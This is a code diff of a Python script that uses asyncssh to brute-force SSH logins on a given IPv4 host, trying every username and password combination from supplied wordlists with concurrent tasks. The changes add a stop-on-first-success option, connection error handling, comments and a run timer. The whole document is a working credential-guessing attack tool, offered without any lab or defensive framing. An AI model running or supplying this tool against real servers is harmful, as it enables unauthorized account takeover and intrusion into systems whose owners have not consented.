@@ -1,27 +1,29 @@
-import asyncio
-from asyncio import CancelledError
-import asyncssh
-import argparse
-import ipaddress
-import time
+import asyncio, asyncssh, argparse, ipaddress, time, sys
+from asyncio import TaskGroup
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-i", "--ip", required=True, help = "IPv4 address of the target host")
-parser.add_argument("-t", "--tasks", type=int, default=2, help = "Maximum number of tasks at once.")
+parser.add_argument("-t", "--tasks", type=int, default=3, help = "Maximum number of tasks at once.")
 parser.add_argument("-u", "--user-list", required=True, help = "User list.")
 parser.add_argument("-p", "--password-list", required=True, help = "Password list.")
 parser.add_argument("-P", "--port", type=int, default=22, help = "Alternative SSH port.")
+parser.add_argument("--stop-on-success", action='store_true', help = "The program will stop if a valid credential is found.")
 args = parser.parse_args()
 
+# List to collect all correct credentials
 successful_logins = []
 
+# IP Validation
 try:
     ip = ipaddress.IPv4Address(args.ip)
 except ipaddress.AddressValueError:
     print(f"Invalid IP address: {args.ip}")
     sys.exit(1)
 
+class TerminateTaskGroup(Exception):
+    """Exception raised to terminate a task group."""
 
+# Coroutine to read the wordlists
 async def reading_wordlists():
     with open(args.user_list, "r") as u:
         users = [line.strip() for line in u if line.strip()]
@@ -29,41 +31,47 @@ async def reading_wordlists():
         passwords = [line.strip() for line in p if line.strip()]          
     return users, passwords    
 
+# Connect to the SSH server
 async def brute_force(semaphore, usr, passw):
-    async with semaphore:  
+    async with semaphore: 
         try:
             conn = await asyncssh.connect(host=args.ip, port=args.port, known_hosts=None, username=usr, password=passw)
             conn.close()
             await conn.wait_closed()
-        except asyncssh.PermissionDenied:
+        except asyncssh.PermissionDenied:      
             print(f"[-] Incorrect login: {usr}:{passw} ")
+        except (asyncssh.ConnectionLost, OSError, ConnectionRefusedError) as exc:
+            raise SystemExit(f"SSH Connection failed: {exc}")
         else:
             successful_logins.append((usr, passw))  
             print(f"[+] Succesful login: {usr}:{passw}")
-
+            if args.stop_on_success:
+                raise TerminateTaskGroup()
+  
+                
 
 async def main():
-    semaphore = asyncio.Semaphore(args.tasks) 
-    users, passwords = await reading_wordlists()
+    semaphore = asyncio.Semaphore(args.tasks) # Define maximum tasks
+    users, passwords = await reading_wordlists() # Use "users" and "passwords" from the reding_wordlists() coroutine
     try:
-        async with asyncio.TaskGroup() as tg:
+        async with asyncio.TaskGroup() as tg: # Creating a task group
             for u in users:
-                for p in passwords:            
-                    task = tg.create_task(brute_force(semaphore, u, p))
-    except CancelledError:
-        print("Task has been cancelled")    
+                for p in passwords:      
+                    tg.create_task(brute_force(semaphore, u, p))                       
+    except* TerminateTaskGroup:
+        print("Exiting...")
     print("[+] Correct logins:")
     for username, password in successful_logins:
         print(f"{username}:{password}")
-
-
+        
 if __name__ ==  '__main__':
     try:
         start = time.time()
-        asyncio.run(main())
+        asyncio.run(main())     
     except (KeyboardInterrupt):
-        print("Stopped")   
+        sys.exit("Stopped")       
     finally:
         end = time.time()
-        duration = end - start    
+        duration = end - start   
+        print(f"All done in {duration:.2f} seconds!")     
 
